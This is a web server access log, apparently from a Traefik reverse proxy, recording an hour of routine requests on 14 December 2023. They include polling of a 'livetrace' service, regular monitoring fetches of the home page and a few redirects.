65.153.45.109 - - [14/Dec/2023:06:42:25 +0000] "GET /trace/poll.php?id=ky8vq64qr HTTP/2.0" 200 83 "-" "-" 1054 "livetrace@docker" "http://172.25.0.5:80" 1ms
65.153.45.109 - - [14/Dec/2023:06:42:26 +0000] "GET /trace/poll.php?id=ky8vq64qr HTTP/2.0" 200 83 "-" "-" 1055 "livetrace@docker" "http://172.25.0.5:80" 2ms
65.153.45.109 - - [14/Dec/2023:06:42:27 +0000] "GET /trace/poll.php?id=ky8vq64qr HTTP/2.0" 200 83 "-" "-" 1056 "livetrace@docker" "http://172.25.0.5:80" 2ms
65.153.45.109 - - [14/Dec/2023:06:42:28 +0000] "GET /trace/poll.php?id=ky8vq64qr HTTP/2.0" 200 83 "-" "-" 1057 "livetrace@docker" "http://172.25.0.5:80" 1ms
65.153.45.109 - - [14/Dec/2023:06:42:29 +0000] "GET /trace/poll.php?id=ky8vq64qr HTTP/2.0" 200 83 "-" "-" 1058 "livetrace@docker" "http://172.25.0.5:80" 1ms
65.153.45.109 - - [14/Dec/2023:06:42:30 +0000] "GET /trace/poll.php?id=ky8vq64qr HTTP/2.0" 200 83 "-" "-" 1059 "livetrace@docker" "http://172.25.0.5:80" 1ms
65.153.45.109 - - [14/Dec/2023:06:42:31 +0000] "GET /trace/poll.php?id=ky8vq64qr HTTP/2.0" 200 83 "-" "-" 1060 "livetrace@docker" "http://172.25.0.5:80" 1ms
65.153.45.109 - - [14/Dec/2023:06:42:32 +0000] "GET /trace/poll.php?id=ky8vq64qr HTTP/2.0" 200 83 "-" "-" 1061 "livetrace@docker" "http://172.25.0.5:80" 2ms
65.153.45.109 - - [14/Dec/2023:06:42:33 +0000] "GET /trace/poll.php?id=ky8vq64qr HTTP/2.0" 200 83 "-" "-" 1062 "livetrace@docker" "http://172.25.0.5:80" 2ms
65.153.45.109 - - [14/Dec/2023:06:42:34 +0000] "GET /trace/poll.php?id=ky8vq64qr HTTP/2.0" 200 83 "-" "-" 1063 "livetrace@docker" "http://172.25.0.5:80" 1ms
167.71.120.76 - - [14/Dec/2023:06:42:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1064 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:06:43:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1065 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:06:43:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1066 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:06:44:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1067 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:06:44:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1068 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:06:45:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1069 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:06:45:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1070 "www@docker" "http://172.25.0.8:80" 1ms
89.187.178.158 - - [14/Dec/2023:06:46:09 +0000] "GET /trace/poll.php?id=ky8vq64qr HTTP/2.0" 200 245 "-" "-" 1071 "livetrace@docker" "http://172.25.0.5:80" 33ms
89.187.178.158 - - [14/Dec/2023:06:46:14 +0000] "GET /trace/ HTTP/2.0" 200 768 "-" "-" 1072 "livetrace@docker" "http://172.25.0.5:80" 13ms
89.187.178.158 - - [14/Dec/2023:06:46:14 +0000] "GET /trace/start.php?id=y1e8w69n9 HTTP/2.0" 200 104 "-" "-" 1073 "livetrace@docker" "http://172.25.0.5:80" 3ms
89.187.178.158 - - [14/Dec/2023:06:46:15 +0000] "GET /trace/poll.php?id=y1e8w69n9 HTTP/2.0" 200 233 "-" "-" 1074 "livetrace@docker" "http://172.25.0.5:80" 2ms
89.187.178.158 - - [14/Dec/2023:06:46:16 +0000] "GET /trace/poll.php?id=y1e8w69n9 HTTP/2.0" 200 307 "-" "-" 1075 "livetrace@docker" "http://172.25.0.5:80" 1ms
89.187.178.158 - - [14/Dec/2023:06:46:17 +0000] "GET /trace/poll.php?id=y1e8w69n9 HTTP/2.0" 200 381 "-" "-" 1076 "livetrace@docker" "http://172.25.0.5:80" 1ms
89.187.178.158 - - [14/Dec/2023:06:46:18 +0000] "GET /trace/poll.php?id=y1e8w69n9 HTTP/2.0" 200 455 "-" "-" 1077 "livetrace@docker" "http://172.25.0.5:80" 1ms
89.187.178.158 - - [14/Dec/2023:06:46:19 +0000] "GET /trace/poll.php?id=y1e8w69n9 HTTP/2.0" 200 529 "-" "-" 1078 "livetrace@docker" "http://172.25.0.5:80" 1ms
89.187.178.158 - - [14/Dec/2023:06:46:20 +0000] "GET /trace/poll.php?id=y1e8w69n9 HTTP/2.0" 200 603 "-" "-" 1079 "livetrace@docker" "http://172.25.0.5:80" 1ms
89.187.178.158 - - [14/Dec/2023:06:46:21 +0000] "GET /trace/poll.php?id=y1e8w69n9 HTTP/2.0" 200 677 "-" "-" 1080 "livetrace@docker" "http://172.25.0.5:80" 1ms
89.187.178.158 - - [14/Dec/2023:06:46:22 +0000] "GET /trace/poll.php?id=y1e8w69n9 HTTP/2.0" 200 751 "-" "-" 1081 "livetrace@docker" "http://172.25.0.5:80" 1ms
89.187.178.158 - - [14/Dec/2023:06:46:23 +0000] "GET /trace/poll.php?id=y1e8w69n9 HTTP/2.0" 200 1050 "-" "-" 1082 "livetrace@docker" "http://172.25.0.5:80" 2ms
159.203.109.206 - - [14/Dec/2023:06:46:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1083 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:06:46:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1084 "www@docker" "http://172.25.0.8:80" 0ms
89.187.178.158 - - [14/Dec/2023:06:46:54 +0000] "GET /trace/ HTTP/2.0" 200 768 "-" "-" 1085 "livetrace@docker" "http://172.25.0.5:80" 4ms
89.187.178.158 - - [14/Dec/2023:06:46:54 +0000] "GET /trace/start.php?id=rywv28vol HTTP/2.0" 200 104 "-" "-" 1086 "livetrace@docker" "http://172.25.0.5:80" 3ms
89.187.178.158 - - [14/Dec/2023:06:46:56 +0000] "GET /trace/poll.php?id=rywv28vol HTTP/2.0" 200 233 "-" "-" 1087 "livetrace@docker" "http://172.25.0.5:80" 2ms
89.187.178.158 - - [14/Dec/2023:06:46:57 +0000] "GET /trace/poll.php?id=rywv28vol HTTP/2.0" 200 307 "-" "-" 1088 "livetrace@docker" "http://172.25.0.5:80" 1ms
89.187.178.158 - - [14/Dec/2023:06:46:58 +0000] "GET /trace/poll.php?id=rywv28vol HTTP/2.0" 200 381 "-" "-" 1089 "livetrace@docker" "http://172.25.0.5:80" 1ms
89.187.178.158 - - [14/Dec/2023:06:46:59 +0000] "GET /trace/poll.php?id=rywv28vol HTTP/2.0" 200 455 "-" "-" 1090 "livetrace@docker" "http://172.25.0.5:80" 2ms
89.187.178.158 - - [14/Dec/2023:06:47:00 +0000] "GET /trace/poll.php?id=rywv28vol HTTP/2.0" 200 529 "-" "-" 1091 "livetrace@docker" "http://172.25.0.5:80" 2ms
89.187.178.158 - - [14/Dec/2023:06:47:01 +0000] "GET /trace/poll.php?id=rywv28vol HTTP/2.0" 200 603 "-" "-" 1092 "livetrace@docker" "http://172.25.0.5:80" 2ms
89.187.178.158 - - [14/Dec/2023:06:47:02 +0000] "GET /trace/poll.php?id=rywv28vol HTTP/2.0" 200 677 "-" "-" 1093 "livetrace@docker" "http://172.25.0.5:80" 1ms
89.187.178.158 - - [14/Dec/2023:06:47:03 +0000] "GET /trace/poll.php?id=rywv28vol HTTP/2.0" 200 751 "-" "-" 1094 "livetrace@docker" "http://172.25.0.5:80" 2ms
89.187.178.158 - - [14/Dec/2023:06:47:04 +0000] "GET /trace/poll.php?id=rywv28vol HTTP/2.0" 200 1050 "-" "-" 1095 "livetrace@docker" "http://172.25.0.5:80" 2ms
159.203.109.206 - - [14/Dec/2023:06:47:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1096 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:06:47:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1097 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:06:48:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1098 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:06:48:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1099 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:06:49:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1100 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:06:49:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1101 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:06:50:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1102 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:06:50:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1103 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:06:51:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1104 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:06:51:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1105 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:06:52:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1106 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:06:52:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1107 "www@docker" "http://172.25.0.8:80" 0ms
89.187.178.158 - - [14/Dec/2023:06:52:42 +0000] "GET /trace/ HTTP/2.0" 200 768 "-" "-" 1108 "livetrace@docker" "http://172.25.0.5:80" 4ms
89.187.178.158 - - [14/Dec/2023:06:52:42 +0000] "GET /trace/styles.css HTTP/2.0" 304 0 "-" "-" 1109 "livetrace@docker" "http://172.25.0.5:80" 0ms
89.187.178.158 - - [14/Dec/2023:06:52:42 +0000] "GET /trace/script.js HTTP/2.0" 304 0 "-" "-" 1110 "livetrace@docker" "http://172.25.0.5:80" 0ms
89.187.178.158 - - [14/Dec/2023:06:52:42 +0000] "GET /trace/start.php?id=xmmemiy1r HTTP/2.0" 200 104 "-" "-" 1111 "livetrace@docker" "http://172.25.0.5:80" 2ms
89.187.178.158 - - [14/Dec/2023:06:52:43 +0000] "GET /trace/poll.php?id=xmmemiy1r HTTP/2.0" 200 233 "-" "-" 1112 "livetrace@docker" "http://172.25.0.5:80" 1ms
89.187.178.158 - - [14/Dec/2023:06:52:44 +0000] "GET /trace/poll.php?id=xmmemiy1r HTTP/2.0" 200 307 "-" "-" 1113 "livetrace@docker" "http://172.25.0.5:80" 1ms
89.187.178.158 - - [14/Dec/2023:06:52:45 +0000] "GET /trace/poll.php?id=xmmemiy1r HTTP/2.0" 200 381 "-" "-" 1114 "livetrace@docker" "http://172.25.0.5:80" 1ms
89.187.178.158 - - [14/Dec/2023:06:52:46 +0000] "GET /trace/poll.php?id=xmmemiy1r HTTP/2.0" 200 455 "-" "-" 1115 "livetrace@docker" "http://172.25.0.5:80" 1ms
89.187.178.158 - - [14/Dec/2023:06:52:47 +0000] "GET /trace/poll.php?id=xmmemiy1r HTTP/2.0" 200 529 "-" "-" 1116 "livetrace@docker" "http://172.25.0.5:80" 1ms
89.187.178.158 - - [14/Dec/2023:06:52:48 +0000] "GET /trace/poll.php?id=xmmemiy1r HTTP/2.0" 200 603 "-" "-" 1117 "livetrace@docker" "http://172.25.0.5:80" 1ms
89.187.178.158 - - [14/Dec/2023:06:52:49 +0000] "GET /trace/poll.php?id=xmmemiy1r HTTP/2.0" 200 677 "-" "-" 1118 "livetrace@docker" "http://172.25.0.5:80" 1ms
89.187.178.158 - - [14/Dec/2023:06:52:50 +0000] "GET /trace/poll.php?id=xmmemiy1r HTTP/2.0" 200 751 "-" "-" 1119 "livetrace@docker" "http://172.25.0.5:80" 1ms
89.187.178.158 - - [14/Dec/2023:06:52:51 +0000] "GET /trace/poll.php?id=xmmemiy1r HTTP/2.0" 200 1050 "-" "-" 1120 "livetrace@docker" "http://172.25.0.5:80" 1ms
89.187.178.158 - - [14/Dec/2023:06:53:17 +0000] "GET /trace/ HTTP/2.0" 200 768 "-" "-" 1121 "livetrace@docker" "http://172.25.0.5:80" 4ms
89.187.178.158 - - [14/Dec/2023:06:53:17 +0000] "GET /trace/start.php?id=l7ql9bxgd HTTP/2.0" 200 104 "-" "-" 1122 "livetrace@docker" "http://172.25.0.5:80" 2ms
89.187.178.158 - - [14/Dec/2023:06:53:18 +0000] "GET /trace/poll.php?id=l7ql9bxgd HTTP/2.0" 200 233 "-" "-" 1123 "livetrace@docker" "http://172.25.0.5:80" 2ms
89.187.178.158 - - [14/Dec/2023:06:53:19 +0000] "GET /trace/poll.php?id=l7ql9bxgd HTTP/2.0" 200 307 "-" "-" 1124 "livetrace@docker" "http://172.25.0.5:80" 2ms
89.187.178.158 - - [14/Dec/2023:06:53:20 +0000] "GET /trace/poll.php?id=l7ql9bxgd HTTP/2.0" 200 381 "-" "-" 1125 "livetrace@docker" "http://172.25.0.5:80" 1ms
89.187.178.158 - - [14/Dec/2023:06:53:21 +0000] "GET /trace/poll.php?id=l7ql9bxgd HTTP/2.0" 200 455 "-" "-" 1126 "livetrace@docker" "http://172.25.0.5:80" 1ms
89.187.178.158 - - [14/Dec/2023:06:53:22 +0000] "GET /trace/poll.php?id=l7ql9bxgd HTTP/2.0" 200 529 "-" "-" 1127 "livetrace@docker" "http://172.25.0.5:80" 1ms
89.187.178.158 - - [14/Dec/2023:06:53:23 +0000] "GET /trace/poll.php?id=l7ql9bxgd HTTP/2.0" 200 603 "-" "-" 1128 "livetrace@docker" "http://172.25.0.5:80" 1ms
89.187.178.158 - - [14/Dec/2023:06:53:24 +0000] "GET /trace/poll.php?id=l7ql9bxgd HTTP/2.0" 200 677 "-" "-" 1129 "livetrace@docker" "http://172.25.0.5:80" 1ms
159.203.109.206 - - [14/Dec/2023:06:53:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1130 "www@docker" "http://172.25.0.8:80" 0ms
89.187.178.158 - - [14/Dec/2023:06:53:25 +0000] "GET /trace/poll.php?id=l7ql9bxgd HTTP/2.0" 200 751 "-" "-" 1131 "livetrace@docker" "http://172.25.0.5:80" 1ms
89.187.178.158 - - [14/Dec/2023:06:53:26 +0000] "GET /trace/poll.php?id=l7ql9bxgd HTTP/2.0" 200 1050 "-" "-" 1132 "livetrace@docker" "http://172.25.0.5:80" 2ms
167.71.120.76 - - [14/Dec/2023:06:53:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1133 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:06:54:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1134 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:06:54:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1135 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:06:55:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1136 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:06:55:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1137 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:06:56:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1138 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:06:56:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1139 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:06:57:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1140 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:06:57:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1141 "www@docker" "http://172.25.0.8:80" 1ms
8.209.68.21 - - [14/Dec/2023:06:58:10 +0000] "POST /dns-query HTTP/2.0" 404 19 "-" "-" 1142 "-" "-" 0ms
159.203.109.206 - - [14/Dec/2023:06:58:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1143 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:06:58:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1144 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:06:59:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1145 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:06:59:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1146 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:07:00:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1147 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:07:00:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1148 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:07:01:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1149 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:07:01:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1150 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:07:02:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1151 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:07:02:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1152 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:07:03:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1153 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:07:03:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1154 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:07:04:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1155 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:07:04:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1156 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:07:05:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1157 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:07:05:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1158 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:07:06:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1159 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:07:06:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1160 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:07:07:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1161 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:07:07:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1162 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:07:08:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1163 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:07:08:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1164 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:07:09:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1165 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:07:09:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1166 "www@docker" "http://172.25.0.8:80" 0ms
143.110.222.166 - - [14/Dec/2023:07:09:51 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 1167 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [14/Dec/2023:07:10:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1168 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:07:10:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1169 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:07:11:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1170 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:07:11:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1171 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:07:12:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1172 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:07:12:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1173 "www@docker" "http://172.25.0.8:80" 1ms
143.110.222.166 - - [14/Dec/2023:07:12:56 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 1174 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [14/Dec/2023:07:13:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1175 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:07:13:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1176 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:07:14:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1177 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:07:14:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1178 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:07:15:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1179 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:07:15:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1180 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:07:16:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1181 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:07:16:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1182 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:07:17:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1183 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:07:17:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1184 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:07:18:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1185 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:07:18:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1186 "www@docker" "http://172.25.0.8:80" 0ms
106.75.92.190 - - [14/Dec/2023:07:18:49 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 1187 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [14/Dec/2023:07:19:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1188 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:07:19:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1189 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:07:20:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1190 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:07:20:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1191 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:07:21:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1192 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:07:21:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1193 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:07:22:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1194 "www@docker" "http://172.25.0.8:80" 0ms
205.210.31.22 - - [14/Dec/2023:07:22:29 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 1195 "dashboard@internal" "-" 0ms
205.210.31.22 - - [14/Dec/2023:07:22:29 +0000] "GET /dashboard/ HTTP/1.1" 200 3124 "-" "-" 1196 "dashboard@internal" "-" 0ms
167.71.120.76 - - [14/Dec/2023:07:22:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1197 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:07:23:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1198 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:07:23:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1199 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:07:24:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1200 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:07:24:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1201 "www@docker" "http://172.25.0.8:80" 0ms
141.98.11.60 - - [14/Dec/2023:07:25:16 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 1202 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [14/Dec/2023:07:25:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1203 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:07:25:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1204 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:07:26:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1205 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:07:26:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1206 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:07:27:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1207 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:07:27:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1208 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:07:28:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1209 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:07:28:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1210 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:07:29:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1211 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:07:29:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1212 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:07:30:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1213 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:07:30:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1214 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:07:31:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1215 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:07:31:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1216 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:07:32:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1217 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:07:32:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1218 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:07:33:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1219 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:07:33:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1220 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:07:34:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1221 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:07:34:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1222 "www@docker" "http://172.25.0.8:80" 0ms
